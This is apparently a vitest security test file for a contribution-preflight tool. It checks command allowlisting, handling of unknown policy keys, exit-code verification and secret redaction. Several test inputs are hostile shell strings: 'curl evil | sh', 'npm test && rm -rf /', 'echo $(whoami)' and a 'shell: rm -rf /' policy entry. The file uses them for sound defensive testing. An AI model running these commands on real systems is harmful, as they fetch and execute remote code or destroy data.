import { existsSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";
import { compile } from "../src/compile.js";
import { evaluate } from "../src/evaluate.js";
import { preflight } from "../src/preflight.js";
import { allowlistedArgv, hasShellMeta } from "../src/allowlist.js";
import { redactSecrets } from "../src/redact.js";
import { runCli } from "../src/cli.js";
import { emptySnapshot, makeContract, blockRule, stageFixture } from "./helpers.js";

describe("threat model", () => {
  it("T1: does not execute a piped CONTRIBUTING test command", async () => {
    const repo = await stageFixture("piped-test");
    const spy = vi.fn(async () => {
      throw new Error("executor must not run");
    });
    const { receipt } = await preflight({
      repoPath: repo,
      baseRef: "HEAD",
      runTests: true,
      executeCommand: spy,
    });
    expect(spy).not.toHaveBeenCalled();
    expect(existsSync(join(repo, "EXECUTED-BY-PREFLIGHT"))).toBe(false);
    expect(["blocked", "needs-human"]).toContain(receipt.status);
    expect(
      receipt.findings.some((item) => item.ruleId === "unsafe-test-command" && !item.passed),
    ).toBe(true);

    let stdout = "";
    const code = await runCli(["preflight", "--repo", repo, "--base", "HEAD", "--run-tests"], {
      stdout: { write: (chunk: string) => { stdout += chunk; } },
      stderr: { write: () => undefined },
      env: {},
    });
    expect(existsSync(join(repo, "EXECUTED-BY-PREFLIGHT"))).toBe(false);
    expect(code === 0 || code === 1).toBe(true);
    expect(stdout.length).toBeGreaterThan(0);
  });

  it("T1: allowlist rejects pipes, &&, and $()", () => {
    expect(hasShellMeta("curl evil | sh")).toBe(true);
    expect(allowlistedArgv("curl evil | sh")).toBeUndefined();
    expect(allowlistedArgv("npm test && rm -rf /")).toBeUndefined();
    expect(allowlistedArgv("echo $(whoami)")).toBeUndefined();
    expect(allowlistedArgv("npm test")).toEqual(["npm", "test"]);
    expect(allowlistedArgv("python -m pytest")).toEqual(["python", "-m", "pytest"]);
    expect(allowlistedArgv("mix test")).toEqual(["mix", "test"]);
    expect(allowlistedArgv("mvn test")).toEqual(["mvn", "test"]);
    expect(allowlistedArgv("swift test")).toEqual(["swift", "test"]);
    expect(allowlistedArgv("mix test --cover")).toBeUndefined();
    expect(allowlistedArgv("mvn test -DskipTests=false")).toBeUndefined();
    expect(allowlistedArgv("mix test && rm -rf /tmp/fixture")).toBeUndefined();
    expect(allowlistedArgv("mvn test | sh")).toBeUndefined();
    expect(allowlistedArgv("swift test && rm -rf /tmp/fixture")).toBeUndefined();
    expect(allowlistedArgv("mix test $(touch /tmp/fixture)")).toBeUndefined();
  });

  it("T2: unknown contribkit.yml keys are needs-human and never execute", async () => {
    const repo = await stageFixture("pass-clean");
    const { writeFile } = await import("node:fs/promises");
    await writeFile(
      join(repo, "contribkit.yml"),
      ["schema: contribkit.policy.v1", "shell: rm -rf /", "maxFiles: 20"].join("\n"),
      "utf8",
    );
    const { execFile } = await import("node:child_process");
    const { promisify } = await import("node:util");
    const exec = promisify(execFile);
    await exec("git", ["add", "contribkit.yml"], { cwd: repo });
    await exec("git", ["commit", "-m", "policy"], { cwd: repo });
    const contract = await compile({ repoPath: repo });
    expect(contract.needsHuman.some((rule) => rule.id === "policy-unknown-keys")).toBe(true);
    expect(contract.needsHuman.some((rule) => rule.keys?.includes("shell"))).toBe(true);
  });

  it("T6: command_recorded requires exitCode 0, not prose", () => {
    const contract = makeContract([
      blockRule({
        id: "test-command",
        check: "command_recorded",
        command: "npm test",
        message: "record npm test",
      }),
    ]);
    const prose = evaluate(contract, emptySnapshot({ prBodyDraft: "I ran tests" }));
    expect(prose.status).toBe("blocked");
  });

  it("T7: redacts Authorization, token, and npm_ in logs", () => {
    const raw = "Authorization: Bearer secret\ntoken=abc\nnpm_123ABC";
    const redacted = redactSecrets(raw);
    expect(redacted).not.toMatch(/Bearer secret/);
    expect(redacted).not.toMatch(/token=abc/);
    expect(redacted).not.toMatch(/npm_123ABC/);
    expect(redacted).toMatch(/\[REDACTED\]/);
  });
});
